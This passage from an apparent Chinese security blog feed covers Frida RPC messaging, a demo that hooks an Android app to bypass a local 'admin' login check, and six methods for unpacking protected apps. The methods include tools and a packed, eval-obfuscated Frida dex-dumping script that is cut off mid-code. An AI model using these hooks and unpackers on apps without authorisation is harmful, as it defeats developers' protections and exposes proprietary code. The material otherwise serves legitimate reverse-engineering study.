class="line"><span class="keyword">def</span> <span class="title function_">on_message</span>(<span class="params">message, data</span>):</span><br><span class="line">    <span class="built_in">print</span>(message)</span><br><span class="line"></span><br><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 现在可以通过 RPC 调用函数</span></span><br><span class="line">result = script.exports.myFunction(arg1, arg2)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><h3 id="script-on"><a href="#script-on" class="headerlink" title="script.on"></a>script.on</h3><p>在 Frida 的脚本中使用 <code>script.on</code> 方法是为了设置一个事件监听器，它允许你捕获并处理脚本中发出的消息。这通常用于以下两种情况：</p><ol><li><strong>接收脚本中的输出</strong>：脚本可以通过 <code>send</code> 方法发送消息到附加的进程（例如，打印调试信息或者返回结果）。</li><li><strong>处理脚本中的异常</strong>：如果脚本中发生错误，Frida 会自动发送一个包含错误信息的消息。</li></ol><p>以下是 <code>script.on</code> 方法的基本用法：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">script.on(<span class="string">&#x27;message&#x27;</span>, function(message, data) &#123;</span><br><span class="line">    // message 参数包含消息的类型和内容</span><br><span class="line">    // data 参数包含与消息相关的原始数据（如果有的话）</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (message.<span class="built_in">type</span> === <span class="string">&#x27;send&#x27;</span>) &#123;</span><br><span class="line">        // 处理脚本通过 send 方法发送的消息</span><br><span class="line">        console.log(<span class="string">&quot;Received message from script:&quot;</span>, message.payload);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (message.<span class="built_in">type</span> === <span class="string">&#x27;error&#x27;</span>) &#123;</span><br><span class="line">        // 处理脚本中的错误</span><br><span class="line">        console.log(<span class="string">&quot;Script reported an error:&quot;</span>, message.description);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这里 <code>message</code> 对象通常具有以下属性：</p><ul><li><code>type</code>：消息类型，可以是 <code>&#39;send&#39;</code>、<code>&#39;error&#39;</code> 或 <code>&#39;console&#39;</code>。</li><li><code>payload</code>：当消息类型是 <code>&#39;send&#39;</code> 时，这是脚本发送的实际数据。</li><li><code>description</code>：当消息类型是 <code>&#39;error&#39;</code> 时，这是错误描述。</li></ul><p><code>data</code> 参数通常是一个包含原始数据（例如，缓冲区）的对象，它仅在消息类型是 <code>&#39;send&#39;</code> 时有意义。</p><p>使用 <code>script.on</code> 方法，你可以确保在脚本运行时能够接收和处理任何重要的通知或数据，从而实现与脚本的交互。这在调试和与脚本进行通信时非常有用。</p><h3 id="rpc-exports"><a href="#rpc-exports" class="headerlink" title="rpc.exports"></a>rpc.exports</h3><p><code>rpc.exports</code> 是在 Frida 脚本中使用的一个属性，它用于定义可以从外部通过 RPC（远程过程调用）调用的函数。通过这种方式，你可以将 Frida 脚本中的某些功能暴露给外部程序，使得外部程序可以远程执行这些功能。</p><p>以下是如何使用 <code>rpc.exports</code> 的基本步骤：</p><p><strong>第一种方式</strong>，函数直接嵌套在RPC导出中，直接导出。</p><p>test.js代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">hello</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">failPlease</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;oops&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python代码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="string">&quot;设置&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">api = script.exports</span><br><span class="line"><span class="built_in">print</span>(api.hello())</span><br><span class="line"><span class="built_in">print</span>(api.fail_please())</span><br></pre></td></tr></table></figure><p><strong>第二种方式</strong>，先写函数在 RPC ，然后导出。</p><p>test.js 代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hello</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">failPlease</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;oops&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rpc.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="attr">hi</span>: hello,</span><br><span class="line">    <span class="attr">fail</span>: failPlease</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python代码：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="string">&quot;设置&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;test.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line">api = script.exports</span><br><span class="line"><span class="built_in">print</span>(api.hi())</span><br><span class="line"><span class="built_in">print</span>(api.fail())</span><br></pre></td></tr></table></figure><h1 id="0x02-ARIDA-管理PRC脚本-自动生成-http-接口的工具"><a href="#0x02-ARIDA-管理PRC脚本-自动生成-http-接口的工具" class="headerlink" title="0x02 ARIDA-管理PRC脚本&amp;自动生成 http 接口的工具"></a>0x02 ARIDA-管理PRC脚本&amp;自动生成 http 接口的工具</h1><p>下载地址：<a href="https://github.com/tcc0lin/arida">GitHub - tcc0lin&#x2F;arida: 基于FastAPI实现的Frida-RPC工具，自动解析JavaScript文件生成对应API接口</a></p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p><code>Python</code>执行<code>PyexecJs</code>通过<code>Js的AST树</code>结构获取<code>Frida-Js</code>脚本中<code>rpc.exports</code>的方法以及对应方法的参数个数，根据方法名和参数个数通过<code>types.FunctionDef</code>从<code>Python AST字节码</code>来动态生成新的<code>Function对象</code>，并且结合<code>pydantic</code>的<code>create_model</code>自动生成的参数模型注册到<code>FastAPI的路由系统</code>中，实现<code>Frida-RPC</code>的功能。</p><h2 id="工作流程"><a href="#工作流程" class="headerlink" title="工作流程"></a>工作流程</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091433276.png" alt="image.png"> </p><h2 id="核心功能"><a href="#核心功能" class="headerlink" title="核心功能"></a>核心功能</h2><ol><li>管理<code>JavaScript</code>文件，具备<code>APP-文件</code>的映射关系</li><li>自动针对现有的<code>JavaScript</code>方法生成相应的<code>API</code>方法</li><li>自动生成<code>Open API</code>文档</li></ol><h2 id="安装-使用"><a href="#安装-使用" class="headerlink" title="安装&amp;使用"></a>安装&amp;使用</h2><p>参考上面官方地址</p><h2 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091434355.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091434379.png" alt="img"> </p><h1 id="0x03-send-recv-wait"><a href="#0x03-send-recv-wait" class="headerlink" title="0x03 send&#x2F;recv&#x2F;wait"></a>0x03 send&#x2F;recv&#x2F;wait</h1><p><a href="https://www.linqi.net.cn/index.php/archives/293/#cl-6">FRIDA RPC - 奋斗的安卓勇士Blog (linqi.net.cn)</a></p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="1、send"><a href="#1、send" class="headerlink" title="1、send"></a><strong>1、send</strong></h3><ul><li><code>send()</code> 函数用于从Frida脚本向主机控制台发送消息。</li><li>这个函数可以用来传递任何可以被序列化的数据，包括基本数据类型、对象和数组。</li><li>使用示例：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">send(&#x27;Hello from Frida script!&#x27;);</span><br></pre></td></tr></table></figure><h3 id="2、recv"><a href="#2、recv" class="headerlink" title="2、recv():"></a><strong>2、recv()</strong>:</h3><ul><li><code>recv()</code> 函数用于在脚本中设置一个回调函数，该函数将在主机控制台发送消息时被调用。</li><li>你可以使用这个函数来处理从主机控制台接收到的命令或数据。</li><li>使用示例：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">recv(function onData(data) &#123;</span><br><span class="line">    console.log(&#x27;Received data:&#x27;, data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="3、wait"><a href="#3、wait" class="headerlink" title="3、wait():"></a><strong>3、wait()</strong>:</h3><ul><li><code>wait()</code> 函数用于暂停脚本的执行，直到主机控制台调用<code>resume()</code>。</li><li>这可以用于同步操作，尤其是在你需要等待某个外部事件或条件时。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wait();</span><br><span class="line">// 脚本将在这里暂停，直到主机控制台调用resume()</span><br></pre></td></tr></table></figure><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>要实现的功能是，我们不仅仅可以在<code>kali</code>主机上调用安卓<code>app</code>里的函数。我们还可以把数据从安卓<code>app</code>里传递到<code>kali</code>主机上，在主机上进行修改，再传递回安卓<code>app</code>里面去。</p><p>编写这样一个<code>app</code>，其中最核心的地方在于判断用户是否为<code>admin</code>，如果是，则直接返回错误，禁止登陆。如果不是，则把用户和密码上传到服务器上进行验证。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.roysue.demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line"></span><br><span class="line">    EditText username_et;</span><br><span class="line">    EditText password_et;</span><br><span class="line">    TextView message_tv;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">        password_et = (EditText) <span class="built_in">this</span>.findViewById(R.id.editText2);</span><br><span class="line">        username_et = (EditText) <span class="built_in">this</span>.findViewById(R.id.editText);</span><br><span class="line">        message_tv = ((TextView) findViewById(R.id.textView));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.findViewById(R.id.button).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (username_et.getText().toString().compareTo(<span class="string">&quot;admin&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                    message_tv.setText(<span class="string">&quot;You cannot login as admin&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//hook target</span></span><br><span class="line">                message_tv.setText(<span class="string">&quot;Sending to the server :&quot;</span> + Base64.encodeToString((username_et.getText().toString() + <span class="string">&quot;:&quot;</span> + password_et.getText().toString()).getBytes(), Base64.DEFAULT));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终程序运行之后，效果如下：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410091527025.jpeg" alt="img"> </p><p>我们的目标就是在<code>kali</code>主机上“得到”输入框输入的内容，并且修改其输入的内容，并且“传输”给安卓机器，使其通过验证。也就是说，我们哪怕输入<code>admin</code>的账户和密码，也可以绕过本地校验，进行登陆的操作。</p><p>所以最终安卓端的<code>js</code>代码的逻辑就是，截取输入，传输给<code>kali</code>主机，暂停执行，得到<code>kali</code>主机传回的数据之后，继续执行。形成代码如下：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> tv_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;android.widget.TextView&quot;</span>);</span><br><span class="line">  tv_class.<span class="property">setText</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.CharSequence&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span> (<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> string_to_send = x.<span class="title function_">toString</span>();</span><br><span class="line">    <span class="keyword">var</span> string_to_recv;</span><br><span class="line">    <span class="title function_">send</span>(string_to_send); <span class="comment">// 将数据发送给kali主机的python代码</span></span><br><span class="line">    <span class="title function_">recv</span>(<span class="keyword">function</span> (<span class="params">received_json_object</span>) &#123;</span><br><span class="line">      string_to_recv = received_json_object.<span class="property">my_data</span></span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;string_to_recv: &quot;</span> + string_to_recv);</span><br><span class="line">    &#125;).<span class="title function_">wait</span>(); <span class="comment">//收到数据之后，再执行下去</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">setText</span>(string_to_recv);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><code>kali</code>主机端的流程就是，将接受到的<code>JSON</code>数据解析，提取出其中的密码部分，然后将用户名替换成<code>admin</code>，这样就实现了将<code>admin</code>和<code>pw</code>发送给“服务器”的结果。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_message_handler</span>(<span class="params">message, payload</span>):</span><br><span class="line">    <span class="built_in">print</span> message</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    <span class="keyword">if</span> message[<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;send&quot;</span>:</span><br><span class="line">        <span class="built_in">print</span> message[<span class="string">&quot;payload&quot;</span>]</span><br><span class="line">        data = message[<span class="string">&quot;payload&quot;</span>].split(<span class="string">&quot;:&quot;</span>)[<span class="number">1</span>].strip()</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;message:&#x27;</span>, message</span><br><span class="line">        data = data.decode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">        user, pw = data.split(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">        data = (<span class="string">&quot;admin&quot;</span> + <span class="string">&quot;:&quot;</span> + pw).encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;encoded data:&quot;</span>, data</span><br><span class="line">        script.post(&#123;<span class="string">&quot;my_data&quot;</span>: data&#125;)  <span class="comment"># 将JSON对象发送回去</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;Modified data sent&quot;</span></span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">pid = device.spawn([<span class="string">&quot;com.roysue.demo04&quot;</span>])</span><br><span class="line">device.resume(pid)</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">session = device.attach(pid)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;s4.js&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    script = session.create_script(f.read())</span><br><span class="line">script.on(<span class="string">&quot;message&quot;</span>, my_message_handler)  <span class="comment"># 注册消息处理函数</span></span><br><span class="line">script.load()</span><br><span class="line">raw_input()</span><br></pre></td></tr></table></figure><p>我们只要输入任意用户名(非admin)+密码，非admin的用户名可以绕过<code>compareTo</code>校验，然后<code>frida</code>会帮助我们将用户名改成<code>admin</code>，最终就是<code>admin:pw</code>的组合发送到服务器。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ python loader4.py</span><br><span class="line"></span><br><span class="line">Script loaded successfully</span><br><span class="line">&#123;u&#x27;type&#x27;: u&#x27;send&#x27;, u&#x27;payload&#x27;: u&#x27;Sending to the server :YWFhYTpiYmJi\n&#x27;&#125;</span><br><span class="line">None</span><br><span class="line">Sending to the server :YWFhYTpiYmJi</span><br><span class="line"></span><br><span class="line">message: &#123;u&#x27;type&#x27;: u&#x27;send&#x27;, u&#x27;payload&#x27;: u&#x27;Sending to the server :YWFhYTpiYmJi\n&#x27;&#125;</span><br><span class="line">data: aaaa:bbbb</span><br><span class="line">pw: bbbb</span><br><span class="line">encoded data: YWRtaW46YmJiYg==</span><br><span class="line"></span><br><span class="line">Modified data sent</span><br><span class="line">string_to_recv: YWRtaW46YmJiYg==</span><br></pre></td></tr></table></figure><p>动态修改输入内容就这样实现了。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Frida </tag>
            
            <tag> Rpc </tag>
            
            <tag> 主动调用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>六个常见的脱壳方式</title>
      <link href="/2024/10/08/%E5%85%AD%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E8%84%B1%E5%A3%B3%E6%96%B9%E5%BC%8F/"/>
      <url>/2024/10/08/%E5%85%AD%E4%B8%AA%E5%B8%B8%E8%A7%81%E7%9A%84%E8%84%B1%E5%A3%B3%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>文章来自：<a href="https://mp.weixin.qq.com/s/pcX_zaqrNsbv89VQm5NLsQ">https://mp.weixin.qq.com/s/pcX_zaqrNsbv89VQm5NLsQ</a></p><h3 id="一、BlackDex：软件方案"><a href="#一、BlackDex：软件方案" class="headerlink" title="一、BlackDex：软件方案"></a>一、BlackDex：软件方案</h3><p><strong>BlackDex</strong>：<a href="https://github.com/CodingGay/BlackDex">https://github.com/CodingGay/BlackDex</a></p><p><strong>限制条件</strong>：版本貌似&lt;&#x3D;7.x<br><strong>BlackDex32</strong>和<strong>BlackDex64</strong>两个都直接打开选中要脱壳的软件，等待即可：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405389.png" alt="img"> </p><p>Dex存储目录：&#x2F;storage&#x2F;emulated&#x2F;0&#x2F;Android&#x2F;data&#x2F;top.niunaijun.blackdexa64&#x2F;dump&#x2F;软件包名中（如果是32就后面64改32即可）</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405353.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405465.png" alt="img">、</p><p>这种脱出来这么点的，基本就不是了，选中看一眼就知道了，可以尝试其他方案。</p><h3 id="二、DITOR：模块方案1"><a href="#二、DITOR：模块方案1" class="headerlink" title="二、DITOR：模块方案1"></a>二、DITOR：模块方案1</h3><p><strong>限制条件</strong>：安卓版本还是&lt;&#x3D;7.x</p><p>先在Xposed里面勾选启用模块。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405333.png" alt="img"> </p><p>然后点击&#x2F;直接点击app图标进入：</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1728214986974-5dd5c9c0-fc79-4465-8d4b-651668782123.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405528.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405110.png" alt="img"> </p><p>这里我安卓7.1.2的模拟器装的用第一个getDex云脱壳方案，安卓7以上的用dumpMemery方案。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405151.png" alt="img"> </p><p>目录在**&#x2F;storage&#x2F;emulated&#x2F;0&#x2F;dexInjector&#x2F;软件包名下**</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405242.png" alt="img"> </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1728215069693-9a1fe67c-a8db-4fd9-a955-9534f6ac295a.png" alt="img"> </p><h3 id="三、反射大师：模块方案2"><a href="#三、反射大师：模块方案2" class="headerlink" title="三、反射大师：模块方案2"></a>三、反射大师：模块方案2</h3><p><strong>限制条件</strong>：安卓版本还是&lt;&#x3D;7.1.0</p><p>这里由于”爱作业“这个倒霉蛋不支持7.1以下运行，所以换个倒霉蛋客串一下。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405258.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405346.png" alt="img"> </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/2167914/1728215132323-a15a2cf5-9092-4c58-ab05-bd9dece94b87.png" alt="img"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405452.png" alt="img"> </p><p>长按-写出DEX</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405576.png" alt="img"> </p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202410/202410081405931.png" alt="img"></p><h3 id="四、frida-dexdump-Frida方案"><a href="#四、frida-dexdump-Frida方案" class="headerlink" title="四、frida-dexdump:Frida方案"></a>四、frida-dexdump:Frida方案</h3><p><a href="http://mp.weixin.qq.com/s?__biz=MzIzNDU5Mzk2OQ==&mid=2247485886&idx=1&sn=25b62d9f1e0ab1ace6c76bdaabb607b0&chksm=e8f54260df82cb7682cdb866f4dd3b2bb7f8b8cc826543db7455f5486a0226db07b9f8c57ec4&scene=21#wechat_redirect">http://mp.weixin.qq.com/s?__biz=MzIzNDU5Mzk2OQ==&amp;mid=2247485886&amp;idx=1&amp;sn=25b62d9f1e0ab1ace6c76bdaabb607b0&amp;chksm=e8f54260df82cb7682cdb866f4dd3b2bb7f8b8cc826543db7455f5486a0226db07b9f8c57ec4&amp;scene=21#wechat_redirect</a></p><p>使用方式看这篇文章</p><h3 id="五、脱壳脚本：脚本方案"><a href="#五、脱壳脚本：脚本方案" class="headerlink" title="五、脱壳脚本：脚本方案"></a>五、脱壳脚本：脚本方案</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="keyword">function</span>(<span class="params">p,a,c,k,e,d</span>)&#123;e=<span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">&quot;&quot;</span>:<span class="title function_">e</span>(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c+<span class="number">29</span>):c.<span class="title function_">toString</span>(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/^/</span>,<span class="title class_">String</span>))&#123;<span class="keyword">while</span>(c--)d[<span class="title function_">e</span>(c)]=k[c]||<span class="title function_">e</span>(c);k=[<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="keyword">return</span> d[e]&#125;];e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span><span class="string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="number">1</span>;&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span>+<span class="title function_">e</span>(c)+<span class="string">&#x27;\\b&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),k[c]);<span class="keyword">return</span> p;&#125;(<span class="string">&#x27;7 1g()&#123;2 1f=a.g(\&#x27;h.8\&#x27;,\&#x27;M\&#x27;);2 M=c i(1f,\&#x27;6\&#x27;,[\&#x27;e\&#x27;,\&#x27;6\&#x27;]);2 15=a.g(&quot;h.8&quot;,&quot;11&quot;);2 11=c i(15,&quot;6&quot;,[&quot;6&quot;,&quot;e&quot;,&quot;6&quot;]);2 19=a.g(\&#x27;h.8\&#x27;,\&#x27;w\&#x27;);2 w=c i(19,\&#x27;6\&#x27;,[\&#x27;6\&#x27;]);2 4=y.K(&quot;/1u/1r/1s&quot;);2 9=M(4,0);3(9!=-1)&#123;2 U=y.1x(1b);2 W=11(9,U,1b);w(9);W=f(U).E();Z W&#125;Z&quot;-1&quot;&#125;7 u(4)&#123;2 16=a.g(\&#x27;h.8\&#x27;,\&#x27;u\&#x27;);2 u=c i(16,\&#x27;6\&#x27;,[\&#x27;e\&#x27;,\&#x27;6\&#x27;]);2 14=a.g(\&#x27;h.8\&#x27;,\&#x27;X\&#x27;);2 X=c i(14,\&#x27;e\&#x27;,[\&#x27;e\&#x27;]);2 17=a.g(\&#x27;h.8\&#x27;,\&#x27;T\&#x27;);2 T=c i(17,\&#x27;6\&#x27;,[\&#x27;e\&#x27;]);2 q=y.K(4);2 V=X(q);3(V!=0)&#123;T(V);Z 0&#125;u(q,1a);o(4)&#125;7 o(4)&#123;2 18=a.g(\&#x27;h.8\&#x27;,\&#x27;o\&#x27;);2 o=c i(18,\&#x27;6\&#x27;,[\&#x27;e\&#x27;,\&#x27;6\&#x27;]);2 q=y.K(4);o(q,1a)&#125;7 G()&#123;2 s=B.1G(&quot;s.8&quot;);2 p=k;2 O=s.1B();1A(2 x=0;x&lt;O.1z;x++)&#123;2 v=O[x];2 m=v.1C;3(m.d(&quot;1F&quot;)&gt;=0&amp;&amp;m.d(&quot;1m&quot;)&gt;=0&amp;&amp;m.d(&quot;1E&quot;)&gt;=0&amp;&amp;m.d(&quot;1D&quot;)&gt;=0)&#123;n.l(m,v.1k);p=v.1k&#125;&#125;2 Q=&#123;&#125;;2 A=1;n.l(&quot;[1m:]&quot;,p);3(p)&#123;13.10(p,&#123;12:7(j)&#123;2 N=j[5];2 t=f(N).1h(B.P).1L();2 Y=f(N).1h(B.P+B.P).1M();3(Q[t]==L)&#123;Q[t]=Y;2 1e=f(t).E();3(1e.d(&quot;H&quot;)==0)&#123;2 z=1g();3(z!=&quot;-1&quot;)&#123;2 S=&quot;/1i/1i/&quot;+z+&quot;/1J/1N&quot;+z;u(S);2 I=S+&quot;/1I&quot;+(A==1?&quot;&quot;:A)+&quot;.H&quot;;n.l(&quot;[1K H]:&quot;,I);2 9=c 1H(I,&quot;1o&quot;);3(9&amp;&amp;9!=k)&#123;A++;2 1l=f(t).1q(Y);9.1p(1l);9.1n();9.w();n.l(&quot;[1w H]:&quot;,I)&#125;&#125;&#125;&#125;&#125;,J:7(R)&#123;&#125;&#125;)&#125;&#125;2 r=1v;7 1y()&#123;13.10(a.1d(k,&quot;1c&quot;),&#123;12:7(j)&#123;2 b=j[0];3(b!==L&amp;&amp;b!=k)&#123;2 4=f(b).E();3(4.d(&quot;s.8&quot;)&gt;=0)&#123;D.C=F;n.l(&quot;[1c:]&quot;,4)&#125;&#125;&#125;,J:7(R)&#123;3(D.C&amp;&amp;!r)&#123;G();r=F&#125;&#125;&#125;);13.10(a.1d(k,&quot;1j&quot;),&#123;12:7(j)&#123;2 b=j[0];3(b!==L&amp;&amp;b!=k)&#123;2 4=f(b).E();3(4.d(&quot;s.8&quot;)&gt;=0)&#123;D.C=F;n.l(&quot;[1j:]&quot;,4)&#125;&#125;&#125;,J:7(R)&#123;3(D.C&amp;&amp;!r)&#123;G();r=F&#125;&#125;&#125;)&#125;1t(G);&#x27;</span>,<span class="number">62</span>,<span class="number">112</span>,<span 